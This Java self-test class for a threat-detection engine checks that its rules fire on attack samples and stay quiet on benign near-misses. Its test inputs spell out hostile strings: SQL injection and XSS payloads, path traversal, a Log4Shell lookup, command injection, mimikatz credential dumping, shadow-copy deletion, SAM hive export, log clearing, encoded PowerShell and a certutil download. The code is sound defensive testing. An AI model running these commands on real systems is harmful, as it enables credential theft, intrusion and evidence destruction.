package com.threatdetection.platform;

import com.threatdetection.aegis.AegisRule;
import com.threatdetection.aegis.AegisSignal;
import com.threatdetection.aegis.rules.FirewallRule;
import com.threatdetection.aegis.rules.PathTraversalRule;
import com.threatdetection.aegis.rules.SysmonProcessRule;
import com.threatdetection.aegis.rules.WebProbeRule;
import com.threatdetection.aegis.rules.WindowsAuditRule;
import com.threatdetection.engine.ThreatDetectionEngine;
import com.threatdetection.model.DetectionOutcome;
import com.threatdetection.model.EventType;
import com.threatdetection.model.LogEvent;
import com.threatdetection.model.ThreatResult;
import com.threatdetection.storage.InMemoryStore;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Supplier;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.threatdetection.aegis.JsonUtil.str;

/**
 * Runs the real detection code against hand-written cases: attacks that must fire, near-misses
 * that must not, and a few documented false positives. Every case uses a private engine instance,
 * so it never touches live data.
 *
 * Not covered on purpose: SUSPICIOUS_TIME (depends on the wall clock), BEHAVIOR_ANOMALY (needs a
 * warmed-up baseline) and THREAT_INTEL_MATCH (needs a feed file).
 */
public final class SelfTest {
    private SelfTest() {}

    public record Case(String group, String rule, String kind, String title, String input,
                       boolean expectFire, int expectPoints, int actualPoints) {
        public boolean pass() {
            boolean fired = actualPoints >= 0;
            if (fired != expectFire) return false;
            return !expectFire || expectPoints < 0 || expectPoints == actualPoints;
        }
    }

    private static final Pattern CORE_RULE = Pattern.compile("^(\\S+) \\(([+-]\\d+)\\): .*$", Pattern.DOTALL);
    private static final String BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    private static final String ATTACKER = "203.0.113.77";

    public static List<Case> run() {
        List<Case> out = new ArrayList<>();
        coreCases(out);
        aegisCases(out);
        out.addAll(com.threatdetection.testing.FalsePositiveTestSuite.cases());
        return out;
    }

    public static String toJson(List<Case> cases) {
        int passed = 0;
        for (Case c : cases) if (c.pass()) passed++;
        StringBuilder sb = new StringBuilder(8192);
        sb.append("{\"total\":").append(cases.size()).append(",\"passed\":").append(passed)
          .append(",\"failed\":").append(cases.size() - passed)
          .append(",\"notCovered\":[\"SUSPICIOUS_TIME (depends on the wall clock)\",\"THREAT_INTEL_MATCH (needs a feed file)\"]")
          .append(",\"cases\":[");
        for (int i = 0; i < cases.size(); i++) {
            Case c = cases.get(i);
            if (i > 0) sb.append(',');
            sb.append("{\"group\":").append(str(c.group()))
              .append(",\"rule\":").append(str(c.rule()))
              .append(",\"kind\":").append(str(c.kind()))
              .append(",\"title\":").append(str(c.title()))
              .append(",\"input\":").append(str(c.input()))
              .append(",\"expectFire\":").append(c.expectFire())
              .append(",\"expectPoints\":").append(c.expectPoints())
              .append(",\"actualPoints\":").append(c.actualPoints())
              .append(",\"pass\":").append(c.pass())
              .append('}');
        }
        return sb.append("]}").toString();
    }

    // ------------------------------------------------------------------ core detectors

    private static void coreCases(List<Case> out) {
        core(out, "BLACKLISTED_IP", "attack", "Request from a listed address (DEMO entry, test engine only)", "ip=1.2.3.4, GET /", true, 50,
                () -> http(new ThreatDetectionEngine(new InMemoryStore(), com.threatdetection.intelligence.ThreatIntelService.demo()),
                        "1.2.3.4", BROWSER, "/", ""));
        core(out, "BLACKLISTED_IP", "benign", "Same address with no blocklist configured (nothing assumed known-bad)", "ip=1.2.3.4, GET /", false, -1,
                () -> http(new ThreatDetectionEngine(new InMemoryStore(), new com.threatdetection.intelligence.ThreatIntelService()),
                        "1.2.3.4", BROWSER, "/", ""));
        core(out, "BLACKLISTED_IP", "benign", "Request from an ordinary address", "ip=192.0.2.10, GET /", false, -1,
                () -> http(engine(), "192.0.2.10", BROWSER, "/", ""));

        core(out, "BRUTE_FORCE", "benign", "4 failed logins in a row (below the threshold)", "4 x LOGIN_FAILED", false, -1,
                () -> fails(4));
        core(out, "BRUTE_FORCE", "attack", "5th failed login reaches the threshold", "5 x LOGIN_FAILED", true, 10,
                () -> fails(5));
        core(out, "BRUTE_FORCE", "attack", "12 failed logins: points grow with every extra attempt", "12 x LOGIN_FAILED (10 + 7 x 5 = 45)", true, 45,
                () -> fails(12));
        core(out, "BRUTE_FORCE", "attack", "30 failed logins: points stop growing at 50", "30 x LOGIN_FAILED (capped)", true, 50,
                () -> fails(30));

        core(out, "SQL_INJECTION", "attack", "Classic tautology in the body", "body: id=1' OR 1=1 --", true, 40,
                () -> http(engine(), "192.0.2.11", BROWSER, "/search", "id=1' OR 1=1 --"));
        core(out, "SQL_INJECTION", "attack", "UNION SELECT in the URL", "GET /items?id=1 UNION SELECT user,pass", true, 40,
                () -> http(engine(), "192.0.2.12", BROWSER, "/items?id=1 UNION SELECT user,pass", ""));
        core(out, "SQL_INJECTION", "benign", "Normal product search", "body: q=blue running shoes", false, -1,
                () -> http(engine(), "192.0.2.13", BROWSER, "/search", "q=blue running shoes"));
        core(out, "SQL_INJECTION", "benign", "Double hyphen in ordinary text (was a false positive, now fixed)", "body: comment=a well--known fact", false, -1,
                () -> http(engine(), "192.0.2.14", BROWSER, "/comment", "comment=a well--known fact"));
        core(out, "SQL_INJECTION", "benign", "URL that contains a double hyphen", "GET /blog/my--first--post", false, -1,
                () -> http(engine(), "192.0.2.18", BROWSER, "/blog/my--first--post", ""));
        core(out, "SQL_INJECTION", "attack", "URL-encoded tautology (evasion attempt)", "GET /s?id=1%27%20OR%201%3D1%20--%20", true, 40,
                () -> http(engine(), "192.0.2.19", BROWSER, "/s?id=1%27%20OR%201%3D1%20--%20", ""));
        core(out, "SQL_INJECTION", "attack", "Comment-obfuscated UNION SELECT (evasion attempt)", "GET /s?id=1/**/UNION/**/SELECT/**/pass", true, 40,
                () -> http(engine(), "192.0.2.24", BROWSER, "/s?id=1/**/UNION/**/SELECT/**/pass", ""));
        core(out, "SQL_INJECTION", "attack", "Quote then comment: admin'--", "body: user=admin'--", true, 40,
                () -> http(engine(), "192.0.2.25", BROWSER, "/login", "user=admin'--"));

        core(out, "XSS_ATTACK", "attack", "Script tag stealing cookies", "body: <script>document.cookie</script>", true, 25,
                () -> http(engine(), "192.0.2.15", BROWSER, "/comment", "<script>document.cookie</script>"));
        core(out, "XSS_ATTACK", "attack", "Event-handler injection", "body: <img src=x onerror=alert(1)>", true, 25,
                () -> http(engine(), "192.0.2.16", BROWSER, "/comment", "<img src=x onerror=alert(1)>"));
        core(out, "XSS_ATTACK", "attack", "URL-encoded script tag (evasion attempt)", "body: %3Cscript%3Ex%3C/script%3E", true, 25,
                () -> http(engine(), "192.0.2.26", BROWSER, "/comment", "%3Cscript%3Ex%3C/script%3E"));
        core(out, "XSS_ATTACK", "benign", "Harmless HTML and the word alertness", "body: <b>great</b> alertness", false, -1,
                () -> http(engine(), "192.0.2.17", BROWSER, "/comment", "<b>great</b> alertness"));

        core(out, "DDOS", "benign", "49 requests inside 10 seconds", "49 x GET /", false, -1,
                () -> flood(49));
        core(out, "DDOS", "attack", "50th request inside 10 seconds", "50 x GET /", true, 30,
                () -> flood(50));

        core(out, "PORT_SCAN", "benign", "4 different ports inside a minute", "ports 21, 22, 23, 25", false, -1,
                () -> ports(21, 22, 23, 25));
        core(out, "PORT_SCAN", "attack", "5th different port inside a minute", "ports 21, 22, 23, 25, 53", true, 25,
                () -> ports(21, 22, 23, 25, 53));

        core(out, "BOT_DETECTED", "attack", "sqlmap in the User-Agent", "User-Agent: sqlmap/1.7", true, 15,
                () -> http(engine(), "192.0.2.20", "sqlmap/1.7", "/", ""));
        core(out, "BOT_DETECTED", "attack", "No User-Agent at all", "User-Agent: (empty)", true, 10,
                () -> http(engine(), "192.0.2.21", "", "/", ""));
        core(out, "BOT_DETECTED", "benign", "Normal browser", "User-Agent: Mozilla/5.0 ...", false, -1,
                () -> http(engine(), "192.0.2.22", BROWSER, "/", ""));
        core(out, "BOT_DETECTED", "benign", "Legitimate curl health check (was a documented false positive, now fixed)", "curl/8.4 GET /health", false, -1,
                () -> http(engine(), "192.0.2.23", "curl/8.4.0", "/health", ""));
        core(out, "BOT_DETECTED", "attack", "curl doing real work (search with parameters) is still flagged", "curl/8.4 GET /search?q=x", true, 15,
                () -> http(engine(), "192.0.2.27", "curl/8.4.0", "/search?q=x", ""));
        core(out, "BOT_DETECTED", "attack", "sqlmap is flagged even on a health path", "sqlmap/1.7 GET /health", true, 15,
                () -> http(engine(), "192.0.2.28", "sqlmap/1.7", "/health", ""));

        core(out, "IMPOSSIBLE_LOGIN", "attack", "Same IP reports IN, then US, seconds apart", "LOGIN_SUCCESS country=IN then country=US", true, 35, () -> {
            ThreatDetectionEngine e = engine();
            e.process(new LogEvent("192.0.2.30", "ravi", "/login", BROWSER, "", "IN", EventType.LOGIN_SUCCESS, 0, ""));
            return e.process(new LogEvent("192.0.2.30", "ravi", "/login", BROWSER, "", "US", EventType.LOGIN_SUCCESS, 0, ""));
        });
        core(out, "IMPOSSIBLE_LOGIN", "attack", "Same ACCOUNT from two different IPs and countries", "ravi: IN (198.51.100.1) then US (203.0.113.9)", true, 35, () -> {
            ThreatDetectionEngine e = engine();
            e.process(new LogEvent("198.51.100.1", "ravi", "/login", BROWSER, "", "IN", EventType.LOGIN_SUCCESS, 0, ""));
            return e.process(new LogEvent("203.0.113.9", "ravi", "/login", BROWSER, "", "US", EventType.LOGIN_SUCCESS, 0, ""));
        });
        core(out, "IMPOSSIBLE_LOGIN", "benign", "Two different people in two countries", "ravi: IN, meena: US", false, -1, () -> {
            ThreatDetectionEngine e = engine();
            e.process(new LogEvent("198.51.100.1", "ravi", "/login", BROWSER, "", "IN", EventType.LOGIN_SUCCESS, 0, ""));
            return e.process(new LogEvent("203.0.113.9", "meena", "/login", BROWSER, "", "US", EventType.LOGIN_SUCCESS, 0, ""));
        });
        core(out, "IMPOSSIBLE_LOGIN", "benign", "Same IP, same country twice", "LOGIN_SUCCESS country=IN twice", false, -1, () -> {
            ThreatDetectionEngine e = engine();
            e.process(new LogEvent("192.0.2.31", "ravi", "/login", BROWSER, "", "IN", EventType.LOGIN_SUCCESS, 0, ""));
            return e.process(new LogEvent("192.0.2.31", "ravi", "/login", BROWSER, "", "IN", EventType.LOGIN_SUCCESS, 0, ""));
        });

        core(out, "BEHAVIOR_ANOMALY", "attack", "Steady trickle for a minute, then a burst of 30 requests", "6 requests 12 s apart, then 30 at once", true, 20,
                SelfTest::burstAfterLearning);
        core(out, "BEHAVIOR_ANOMALY", "benign", "Brand-new IP sends 30 requests with no history (still learning)", "30 requests, no baseline", false, -1,
                () -> {
                    ThreatDetectionEngine e = engine();
                    long t = System.currentTimeMillis();
                    ThreatResult r = null;
                    for (int i = 0; i < 30; i++) r = e.process(new LogEvent("192.0.2.61", "guest", "/", BROWSER, "", "IN", EventType.HTTP_REQUEST, 0, "", t, "", ""));
                    return r;
                });
        core(out, "MALWARE_DOWNLOAD", "attack", "Request for an executable", "DOWNLOAD invoice.exe", true, 30,
                () -> download("invoice.exe"));
        core(out, "MALWARE_DOWNLOAD", "attack", "Request for a PowerShell script", "DOWNLOAD update.ps1", true, 30,
                () -> download("update.ps1"));
        core(out, "MALWARE_DOWNLOAD", "benign", "Request for a PDF", "DOWNLOAD report.pdf", false, -1,
                () -> download("report.pdf"));
    }

    private interface Run extends Supplier<ThreatResult> {}

    private static void core(List<Case> out, String rule, String kind, String title, String input,
                             boolean expectFire, int expectPoints, Run run) {
        ThreatResult r = run.get();
        out.add(new Case("core", rule, kind, title, input, expectFire, expectPoints, pointsOf(r, rule)));
    }

    private static ThreatDetectionEngine engine() {
        return new ThreatDetectionEngine(new InMemoryStore());
    }

    private static ThreatResult burstAfterLearning() {
        ThreatDetectionEngine e = engine();
        long t0 = System.currentTimeMillis() - 100_000L;
        for (int k = 0; k < 6; k++) {
            e.process(new LogEvent("192.0.2.60", "guest", "/", BROWSER, "", "IN", EventType.HTTP_REQUEST, 0, "", t0 + k * 12_000L, "", ""));
        }
        ThreatResult r = null;
        for (int i = 0; i < 30; i++) {
            r = e.process(new LogEvent("192.0.2.60", "guest", "/", BROWSER, "", "IN", EventType.HTTP_REQUEST, 0, "", t0 + 72_000L + i * 20L, "", ""));
        }
        return r;
    }

    private static ThreatResult http(ThreatDetectionEngine e, String ip, String ua, String endpoint, String body) {
        return e.process(new LogEvent(ip, "guest", endpoint, ua, body, "IN", EventType.HTTP_REQUEST, 0, ""));
    }

    private static ThreatResult fails(int n) {
        ThreatDetectionEngine e = engine();
        ThreatResult r = null;
        for (int i = 0; i < n; i++) {
            r = e.process(new LogEvent("192.0.2.40", "admin", "/login", BROWSER, "", "IN", EventType.LOGIN_FAILED, 0, ""));
        }
        return r;
    }

    private static ThreatResult flood(int n) {
        ThreatDetectionEngine e = engine();
        ThreatResult r = null;
        for (int i = 0; i < n; i++) r = http(e, "192.0.2.41", BROWSER, "/", "");
        return r;
    }

    private static ThreatResult ports(int... ports) {
        ThreatDetectionEngine e = engine();
        ThreatResult r = null;
        for (int p : ports) {
            r = e.process(new LogEvent("192.0.2.42", "guest", "/", BROWSER, "", "IN", EventType.PORT_ACCESS, p, ""));
        }
        return r;
    }

    private static ThreatResult download(String file) {
        return engine().process(new LogEvent("192.0.2.43", "guest", "/files", BROWSER, "", "IN", EventType.DOWNLOAD_REQUEST, 0, file));
    }

    private static int pointsOf(ThreatResult r, String rule) {
        if (r == null) return -1;
        for (String s : r.triggeredRules) {
            Matcher m = CORE_RULE.matcher(s);
            if (m.matches() && m.group(1).equals(rule)) return Integer.parseInt(m.group(2));
        }
        return -1;
    }

    // ------------------------------------------------------------------ AEGIS rules

    private static void aegisCases(List<Case> out) {
        AegisRule traversal = new PathTraversalRule();
        AegisRule probe = new WebProbeRule();
        AegisRule audit = new WindowsAuditRule();
        AegisRule sysmon = new SysmonProcessRule();

        rule(out, traversal, "PATH_TRAVERSAL", "attack", "Dot-dot-slash to /etc/passwd", "GET /download?file=../../etc/passwd", true, 40, web("/download?file=../../etc/passwd"));
        rule(out, traversal, "PATH_TRAVERSAL", "attack", "Double-encoded dot-dot-slash", "GET /a?f=%252e%252e%252fsecret", true, 40, web("/a?f=%252e%252e%252fsecret"));
        rule(out, traversal, "PATH_TRAVERSAL", "benign", "Normal static file", "GET /images/logo.png", false, -1, web("/images/logo.png"));

        rule(out, probe, "LOG4SHELL_PROBE", "attack", "JNDI lookup in a parameter", "GET /?x=${jndi:ldap://203.0.113.5/a}", true, 50, web("/?x=${jndi:ldap://203.0.113.5/a}"));
        rule(out, probe, "LOG4SHELL_PROBE", "benign", "Search for the word jndi", "GET /search?q=jndi+tutorial", false, -1, web("/search?q=jndi+tutorial"));
        rule(out, probe, "COMMAND_INJECTION", "attack", "Semicolon followed by cat", "GET /ping?host=8.8.8.8;cat /etc/passwd", true, 35, web("/ping?host=8.8.8.8;cat /etc/passwd"));
        rule(out, probe, "COMMAND_INJECTION", "benign", "Plain ping parameter", "GET /ping?host=8.8.8.8", false, -1, web("/ping?host=8.8.8.8"));
        rule(out, probe, "SENSITIVE_PATH_PROBE", "attack", "Request for /.env", "GET /.env", true, 15, web("/.env"));
        rule(out, probe, "SENSITIVE_PATH_PROBE", "benign", "A path that only looks similar", "GET /environment/settings", false, -1, web("/environment/settings"));

        rule(out, new FirewallRule(), "EXPOSED_SERVICE_ACCESS", "attack", "Outside address ALLOWED to reach RDP", "ALLOW 203.0.113.9 -> port 3389", true, 25, net("203.0.113.9", 3389, "ALLOW"));
        rule(out, new FirewallRule(), "EXPOSED_SERVICE_ACCESS", "benign", "Outside address ALLOWED to reach HTTPS", "ALLOW 203.0.113.9 -> port 443", false, -1, net("203.0.113.9", 443, "ALLOW"));
        rule(out, new FirewallRule(), "EXPOSED_SERVICE_ACCESS", "benign", "Internal address allowed to reach RDP", "ALLOW 10.0.0.5 -> port 3389", false, -1, net("10.0.0.5", 3389, "ALLOW"));
        rule(out, new FirewallRule(), "SENSITIVE_PORT_PROBE", "attack", "Blocked attempt on MySQL", "DROP 203.0.113.9 -> port 3306", true, 10, net("203.0.113.9", 3306, "DROP"));
        rule(out, new FirewallRule(), "SENSITIVE_PORT_PROBE", "benign", "Blocked attempt on an ordinary port", "DROP 203.0.113.9 -> port 8081", false, -1, net("203.0.113.9", 8081, "DROP"));
        repeated(out, 14, false, -1);
        repeated(out, 15, true, 20);

        rule(out, audit, "ACCOUNT_LOCKOUT", "attack", "Account locked out", "Event 4740", true, 40, win(4740, -1, "", ""));
        rule(out, audit, "AUDIT_LOG_CLEARED", "attack", "Security log cleared", "Event 1102", true, 60, win(1102, -1, "", ""));
        rule(out, audit, "ACCOUNT_CREATED", "attack", "New account created", "Event 4720", true, 30, win(4720, -1, "", "svc_backup"));
        rule(out, audit, "GROUP_MEMBERSHIP_CHANGE", "attack", "Member added to Administrators", "Event 4732, group Administrators", true, 45, win(4732, -1, "", "Administrators"));
        rule(out, audit, "GROUP_MEMBERSHIP_CHANGE", "attack", "Member added to an ordinary group", "Event 4732, group Print Operators", true, 25, win(4732, -1, "", "Print Operators"));
        rule(out, audit, "RDP_FAILED_LOGON", "attack", "Failed Remote Desktop logon", "Event 4625, logon type 10", true, 10, win(4625, 10, "", ""));
        rule(out, audit, "RDP_FAILED_LOGON", "benign", "Failed local logon (type 2)", "Event 4625, logon type 2", false, -1, win(4625, 2, "", ""));
        rule(out, audit, "EXTERNAL_RDP_LOGON", "attack", "Successful RDP logon from an outside address", "Event 4624, type 10, 203.0.113.9", true, 25, win(4624, 10, "203.0.113.9", ""));
        rule(out, audit, "EXTERNAL_RDP_LOGON", "benign", "Successful RDP logon from the office LAN", "Event 4624, type 10, 192.168.1.5", false, -1, win(4624, 10, "192.168.1.5", ""));

        String winword = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
        rule(out, sysmon, "CREDENTIAL_DUMPING", "attack", "mimikatz reading logon passwords", "mimikatz.exe sekurlsa::logonpasswords",
                true, 70, proc("C:\\Users\\Public\\mimikatz.exe", "mimikatz.exe sekurlsa::logonpasswords", "C:\\Windows\\explorer.exe"));
        rule(out, sysmon, "CREDENTIAL_DUMPING", "benign", "Notepad", "notepad.exe", false, -1,
                proc("C:\\Windows\\System32\\notepad.exe", "notepad.exe", "C:\\Windows\\explorer.exe"));
        rule(out, sysmon, "BACKUP_DESTRUCTION", "attack", "Shadow copies deleted", "vssadmin delete shadows /all /quiet", true, 60,
                proc("C:\\Windows\\System32\\vssadmin.exe", "vssadmin delete shadows /all /quiet", "C:\\Windows\\System32\\cmd.exe"));
        rule(out, sysmon, "OFFICE_SPAWNS_SHELL", "attack", "Word starts cmd.exe", "WINWORD.EXE -> cmd.exe", true, 55,
                proc("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami", winword));
        rule(out, sysmon, "OFFICE_SPAWNS_SHELL", "benign", "Explorer starts cmd.exe", "explorer.exe -> cmd.exe", false, -1,
                proc("C:\\Windows\\System32\\cmd.exe", "cmd.exe", "C:\\Windows\\explorer.exe"));
        rule(out, sysmon, "REGISTRY_HIVE_DUMP", "attack", "SAM hive exported", "reg save HKLM\\SAM sam.hive", true, 55,
                proc("C:\\Windows\\System32\\reg.exe", "reg save HKLM\\SAM C:\\temp\\sam.hive", "C:\\Windows\\System32\\cmd.exe"));
        rule(out, sysmon, "LOG_CLEARING", "attack", "wevtutil clears the Security log", "wevtutil cl security", true, 50,
                proc("C:\\Windows\\System32\\wevtutil.exe", "wevtutil cl security", "C:\\Windows\\System32\\cmd.exe"));
        rule(out, sysmon, "SUSPICIOUS_POWERSHELL", "attack", "Hidden, encoded PowerShell", "powershell -nop -w hidden -enc SQBFAFgA...", true, 45,
                proc("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "C:\\Windows\\explorer.exe"));
        rule(out, sysmon, "SUSPICIOUS_POWERSHELL", "benign", "Ordinary PowerShell listing files", "powershell Get-ChildItem", false, -1,
                proc("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell Get-ChildItem C:\\Reports", "C:\\Windows\\explorer.exe"));
        rule(out, sysmon, "LOLBIN_ABUSE", "attack", "certutil downloads a file", "certutil -urlcache -f http://...", true, 45,
                proc("C:\\Windows\\System32\\certutil.exe", "certutil -urlcache -f http://203.0.113.5/a.exe a.exe", "C:\\Windows\\System32\\cmd.exe"));
        rule(out, sysmon, "ACCOUNT_CREATION_CLI", "attack", "net user ... /add", "net user hacker P@ss1 /add", true, 40,
                proc("C:\\Windows\\System32\\net.exe", "net user hacker P@ss1 /add", "C:\\Windows\\System32\\cmd.exe"));
        rule(out, sysmon, "SUSPICIOUS_PERSISTENCE", "attack", "Scheduled task pointing into AppData", "schtasks /create ... AppData\\Roaming\\u.exe", true, 30,
                proc("C:\\Windows\\System32\\schtasks.exe", "schtasks /create /tn upd /tr C:\\Users\\bob\\AppData\\Roaming\\u.exe", "C:\\Windows\\System32\\cmd.exe"));
        rule(out, sysmon, "EXEC_FROM_USER_PATH", "attack", "Program running from the Temp folder", "...\\AppData\\Local\\Temp\\x.exe", true, 20,
                proc("C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe", "x.exe", "C:\\Windows\\explorer.exe"));
        rule(out, sysmon, "RECON_COMMAND", "attack", "Privilege reconnaissance", "whoami /priv", true, 15,
                proc("C:\\Windows\\System32\\whoami.exe", "whoami /priv", "C:\\Windows\\System32\\cmd.exe"));
    }

    private static void rule(List<Case> out, AegisRule rule, String id, String kind, String title, String input,
                             boolean expectFire, int expectPoints, AegisSignal s) {
        DetectionOutcome o = rule.evaluate(s);
        int actual = o != null && id.equals(o.ruleName) ? o.score : -1;
        out.add(new Case("aegis", id, kind, title, input, expectFire, expectPoints, actual));
    }

    private static void repeated(List<Case> out, int attempts, boolean expectFire, int expectPoints) {
        FirewallRule r = new FirewallRule();
        DetectionOutcome o = null;
        for (int i = 0; i < attempts; i++) o = r.evaluate(net(ATTACKER, 8080, "DROP"));
        int actual = o != null && "REPEATED_CONNECTIONS".equals(o.ruleName) ? o.score : -1;
        out.add(new Case("aegis", "REPEATED_CONNECTIONS", expectFire ? "attack" : "benign",
                attempts + " connection attempts to one port inside a minute", attempts + " x DROP -> port 8080",
                expectFire, expectPoints, actual));
    }

    private static AegisSignal web(String path) {
        AegisSignal s = new AegisSignal(AegisSignal.Kind.WEB);
        s.ip = ATTACKER;
        s.path = path;
        return s;
    }

    private static AegisSignal net(String ip, int port, String action) {
        AegisSignal s = new AegisSignal(AegisSignal.Kind.NETWORK);
        s.ip = ip;
        s.port = port;
        s.action = action;
        s.direction = "in";
        return s;
    }

    private static AegisSignal win(int eventId, int logonType, String ip, String path) {
        AegisSignal s = new AegisSignal(eventId == 4624 || eventId == 4625 ? AegisSignal.Kind.AUTH : AegisSignal.Kind.AUDIT);
        s.winEventId = eventId;
        s.logonType = logonType;
        s.ip = ip;
        s.path = path;
        s.user = "administrator";
        return s;
    }

    private static AegisSignal proc(String image, String command, String parent) {
        AegisSignal s = new AegisSignal(AegisSignal.Kind.PROCESS);
        s.path = image;
        s.command = command;
        s.parent = parent;
        return s;
    }
}
